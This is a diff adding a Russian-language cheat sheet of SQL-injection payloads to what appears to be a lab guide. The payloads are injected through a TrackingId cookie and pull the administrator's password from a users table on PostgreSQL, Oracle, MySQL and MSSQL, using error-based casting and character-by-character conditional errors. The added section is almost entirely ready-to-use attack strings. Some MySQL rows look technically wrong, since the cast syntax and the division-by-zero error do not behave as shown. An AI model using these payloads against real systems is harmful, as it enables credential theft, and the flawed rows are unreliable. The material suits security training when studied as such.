@@ -240,3 +240,25 @@ TrackingId=xyz'||(SELECT password FROM users WHERE username='administrator')::in
 Вместо того чтобы ставить -- и обрезать остаток запроса, закрой строку через || и подставь нужное значение — так ты не потеряешь символы на комментарий и перевод строки.
 
 ### 💡 Совет: применяй эти ухищрения последовательно — каждый из них выигрывает по 2–15 символов, и в сумме это часто решает проблему с обрезкой.
+
+## 🧩 Шпаргалка: готовые инъекции для разных СУБД
+
+### 🎯 Получить пароль за 1 запрос (если ошибки показывают данные)
+
+| СУБД | Трафарет (вставлять после `TrackingId=`) |
+| :--- | :--- |
+| **PostgreSQL** | `'||(SELECT password FROM users LIMIT 1)::int||'` |
+| **Oracle** | `'||(SELECT CAST(password AS int) FROM users WHERE ROWNUM=1 AND username='administrator')||'` |
+| **MySQL** | `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--` |
+| **MSSQL** | `' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users))--` |
+
+---
+
+### 🔍 Проверить символ по позиции (если ошибки только меняют статус)
+
+| СУБД | Трафарет (вставлять после `TrackingId=`) |
+| :--- | :--- |
+| **PostgreSQL** | `' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN 1/0 ELSE 1 END FROM users LIMIT 1)=1` |
+| **Oracle** | `' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM=1 AND username='administrator')=''` |
+| **MySQL** | `' AND IF(SUBSTR(password,1,1)='a', 1/0, 1)=1--` |
+| **MSSQL** | `' AND (SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN 1/0 ELSE 1 END FROM users)=1` |
